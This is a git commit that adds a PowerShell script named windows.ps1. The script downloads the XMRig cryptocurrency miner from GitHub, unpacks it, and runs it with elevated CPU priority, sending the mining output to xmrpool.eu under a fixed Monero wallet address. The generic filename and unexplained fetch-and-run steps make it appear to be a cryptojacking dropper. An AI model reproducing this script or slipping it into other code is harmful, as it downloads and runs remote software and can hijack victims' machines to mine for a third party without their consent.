94a9f7d343262bbe63197931b1c67ff042e4c831
rxseth <chanssegoudro8@gmail.com>
2024-06-18 17:32:44 +0300

    Create windows.ps1

---
+++ windows.ps1
@@ -0,0 +1,3 @@
+Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
+Expand-Archive xmrig.zip
+.\xmrig\xmrig-6.21.3\xmrig.exe -o xmrpool.eu:3333 -u 43Gw9bTa1ydeS2kqKvhjkjNAPDtiKqRTnCac2ywBkV8dKPD1cPfAnEv7zxVNSePoJv8FmNZdeojAAcNsepKeRyBWFMQQiHF --cpu-priority 4
